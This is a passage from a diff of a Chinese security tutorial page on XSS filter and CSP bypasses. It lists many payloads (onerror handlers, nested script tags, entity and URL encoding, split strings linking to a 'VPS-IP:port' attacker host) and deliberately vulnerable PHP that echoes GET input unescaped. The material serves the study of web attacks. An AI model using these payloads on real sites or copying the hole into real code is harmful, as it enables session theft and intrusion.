-<h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;frames[`al`+`ert`](1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+<h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <h5 id="嵌套替换"><a href="#嵌套替换" class="headerlink" title="嵌套替换"></a>嵌套替换</h5><p>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;sc<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Evi1s7&#x27;</span>)&lt;/sc</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>ript&gt;<br></code></pre></td></tr></table></figure>
+<h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img src <span class="hljs-attribute">onerror</span>=_=alert,_(1)&gt;<br>&lt;img src <span class="hljs-attribute">x</span>=al <span class="hljs-attribute">y</span>=ert <span class="hljs-attribute">onerror</span>=top[x+y](1)&gt;<br>&lt;img src <span class="hljs-attribute">x</span>=al <span class="hljs-attribute">y</span>=ert <span class="hljs-attribute">onerror</span>=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。<br>&lt;img src <span class="hljs-attribute">onerror</span>=top[<span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;al&#x27;</span>,b=&#x27;ev&#x27;,b+a](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)&gt;<br>&lt;img src onerror=[<span class="hljs-string">&#x27;ale&#x27;</span>+<span class="hljs-string">&#x27;rt&#x27;</span>].map(top[<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>])[0][<span class="hljs-string">&#x27;valu&#x27;</span>+<span class="hljs-string">&#x27;eOf&#x27;</span>]()(1)&gt;<br></code></pre></td></tr></table></figure>
 <h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML编码转义"><a href="#HTML编码转义" class="headerlink" title="HTML编码转义"></a>HTML编码转义</h5><p>当可控点为单个标签属性时，可以使用 html 实体编码。<br>可采用十进制、十六进制或填充0的方式<br>填充0：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;a href=&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&gt;aaa&lt;/a&gt;<br></code></pre></td></tr></table></figure>
 <h5 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h5><p>需要注入点存在href属性或者src属性，才可以利用url编码转义且在url解析过程中，不能对协议类型进行任何的编码操作<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;233&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;a href<span class="hljs-operator">=</span>javascript:<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%74</span><span class="hljs-variable">%28</span><span class="hljs-variable">%31</span><span class="hljs-variable">%29</span>&gt;<span class="hljs-number">233</span>&lt;/a&gt;<br></code></pre></td></tr></table></figure>
 <p>src属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们（如img、script标签）<br>href属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL（如link、a标签）</p>
 <h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;html&gt;</span><span class="hljs-section">&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></code></pre></td></tr></table></figure>
 <p>A： /，/123/，%09，%0A，%0C，%0D，%20<br>B：%09，%0A，%0C，%0D，%20<br>C：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）<br>D：%09，%0A，%0C，%0D，%20，//，&gt;</p>
-<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="()绕过"></a>()绕过</h4><h5 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert`1`</span><br></pre></td></tr></table></figure>
-<h5 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="()绕过"></a>()绕过</h4><h5 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">alert</span>`<span class="hljs-number">1</span>`<br></code></pre></td></tr></table></figure>
+<h5 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <h4 id="alert绕过（关键词过滤绕过的特殊情况）"><a href="#alert绕过（关键词过滤绕过的特殊情况）" class="headerlink" title="alert绕过（关键词过滤绕过的特殊情况）"></a>alert绕过（关键词过滤绕过的特殊情况）</h4><h5 id="函数替换-1"><a href="#函数替换-1" class="headerlink" title="函数替换"></a>函数替换</h5><p>可用prompt()、confirm()、console.log()、document.write()</p>
-<h5 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;aaa&lt;/a&gt;</span><br><span class="line">#alert(1)</span><br></pre></td></tr></table></figure>
-<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><h5 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;1&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="eval-拼接"><a href="#eval-拼接" class="headerlink" title="eval()拼接"></a>eval()拼接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;1&lt;/a&gt;&quot;)</span><br></pre></td></tr></table></figure>
-<h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;a href=javascript:<span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>c<span class="hljs-meta">%</span><span class="hljs-number">65</span><span class="hljs-meta">%</span><span class="hljs-number">72</span><span class="hljs-meta">%</span><span class="hljs-number">74</span><span class="hljs-meta">%</span><span class="hljs-number">28</span><span class="hljs-meta">%</span><span class="hljs-number">31</span><span class="hljs-meta">%</span><span class="hljs-number">29</span>&gt;aaa&lt;/a&gt;<br><span class="hljs-attr">#alert(1</span>)<br></code></pre></td></tr></table></figure>
+<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><h5 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=<span class="hljs-string">&#x27;document.write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;&lt;a href=ht&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;tp://VPS-IP:po&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;rt&gt;1&lt;/a&gt;&quot;)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h5 id="eval-拼接"><a href="#eval-拼接" class="headerlink" title="eval()拼接"></a>eval()拼接</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.write(&quot;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">http://VPS-IP:port</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;)<br></code></pre></td></tr></table></figure>
+<h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="hljs-template-variable">&#123;onerror=alert&#125;</span><span class="language-xml"><span class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 <h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>CSP指的是Content Security Policy，即内容安全策略。CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置，让管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被攻击的风险。</p>
 <h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>1.Content-Security-Policy:配置好并且启用后，直接拦截不符合CSP的资源<br>2.Content-Security-Policy-Report-Only：配置好之后仅记录违反限制的行为，并不能进行拦截(这里也是一个漏洞)，和report-uri选项配合时可以进行拦截违法行为</p>
 <h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>CSP由一组指令组成，每个指令用于指定允许加载的资源类型和来源，一个CSP头由多组CSP策略组成，中间由分号分隔。</p>
 <p>指令关键字：指令关键字用于标识指令类型，例如default-src、script-src、style-src等<br>指令值：指令值用于指定允许加载资源的来源，可以是一个或多个来源，多个来源之间用空格分隔。来源可以是URL、域名、IP地址或通配符等<br>指令选项：指令选项用于指定一些特殊行为，例如’self’选项用于指定资源只能从同一域名加载，’unsafe-inline’选项用于允许内联脚本等<br>指令策略：指令策略用于指定如何处理不符合CSP策略的请求，可以选择’allow’、’block’、’report’等选项，每一组策略包含一个策略指令和一个内容源列表<br>例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; example.com; img-src * data:; report-uri /csp-report</span><br></pre></td></tr></table></figure>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span> <span class="hljs-string">&#x27;unsafe-inline&#x27;</span> example.com; <span class="hljs-keyword">img-src</span> * data:; <span class="hljs-keyword">report-uri</span> /csp-report<br></code></pre></td></tr></table></figure>
 <p>Content-Security-Policy是CSP的header字段<br>default-src指令用于限制默认允许加载的资源类型和来源<br>script-src指令用于限制JavaScript脚本的来源<br>img-src指令用于限制图片的来源<br>策略还指定了违规报告的URL</p>
 <h5 id="常见策略指令"><a href="#常见策略指令" class="headerlink" title="常见策略指令"></a>常见策略指令</h5><p>与特定的源（例如域名、协议、端口）一起使用或使用通配符（*）来表示所有来源<br>default-src: 指定默认允许加载的资源类型和来源。<br>script-src: 限制JavaScript脚本的来源。<br>style-src: 限制CSS样式表的来源。<br>img-src: 限制图片的来源。<br>connect-src: 限制XMLHttpRequest和WebSocket的来源。<br>font-src: 限制字体的来源。<br>object-src: 限制object、embed、applet等插件的来源。<br>media-src: 限制音频、视频等媒体资源的来源。<br>frame-src: 限制iframe的来源。<br>child-src: 限制子窗口的来源，包括iframe、web worker、embed等。<br>form-action: 限制表单提交的目标地址。<br>sandbox: 限制iframe中的脚本和插件的执行权限。<br>base-uri: 限制base标签的目标地址。<br>report-uri: 指定违规报告的URL。</p>
 <h5 id="策略指令中常见的关键词"><a href="#策略指令中常见的关键词" class="headerlink" title="策略指令中常见的关键词"></a>策略指令中常见的关键词</h5><p>用于指定资源的类型和来源<br>1.self: 表示当前网站的源，也就是只允许从同一域名加载资源。<br>2.none: 表示不允许加载任何资源。<br>3.unsafe-inline: 表示允许内联脚本、样式表等，但存在安全风险。<br>4.unsafe-eval: 表示允许使用eval()函数执行代码，但存在安全风险。<br>5.strict-dynamic: 表示允许通过nonce或hash机制执行动态脚本，但不允许其他方式的动态脚本。<br>6.nonce-xxxx: 表示允许执行指定的nonce值所对应的脚本，用于限制内联脚本的来源。<br>7.hash-xxxx: 表示允许执行指定的哈希值所对应的脚本，用于限制外部脚本的来源。<br>8.data:: 表示允许加载data URI格式的资源。<br>9.blob:: 表示允许加载blob URL格式的资源。<br>10.mediastream:: 表示允许加载mediastream格式的资源</p>
 <h5 id="CSP策略指令中的存在安全风险数据类型"><a href="#CSP策略指令中的存在安全风险数据类型" class="headerlink" title="CSP策略指令中的存在安全风险数据类型"></a>CSP策略指令中的存在安全风险数据类型</h5><p>1.data:用于指定可以从data URI格式加载的资源。data URI可以直接将资源的内容编码为字符串嵌入到URL中，而不需要从外部加载资源<br>作为攻击者，可以利用data uri构造恶意脚本直接嵌入URL中，从而进行XSS攻击<br>2.mediastream:用于指定可以从哪些媒体流（例如摄像头或麦克风）加载资源。配合media-src策略指令使用，允许 mediastream: URI 作为内容来源。<br>3.blob:允许在HTML页面中使用Blob URL，这是一种允许在浏览器中生成URL的API。当CSP策略允许任何来源使用blob数据类型时，会产生安全风险。<br>4.unsafe-inline:允许在HTML页面中直接嵌入JavaScript代码。这是一种方便的方法，可以将脚本与页面混合在一起，但是也容易受到XSS攻击的威胁。<br>5.unsafe-eval:允许在HTML页面中使用eval函数来执行JavaScript代码，攻击者可以通过注入特殊的参数（数据注入攻击）来控制eval函数的执行结果，从而达到执行恶意代码的目的。</p>
 <h5 id="绕过策略"><a href="#绕过策略" class="headerlink" title="绕过策略"></a>绕过策略</h5><p>1.iframe标签<br>如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;Ev1ls7&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;CSP&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;Evi1s7&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--2.php--&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;CSP&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;Evi1s7&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;Evi1s7&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 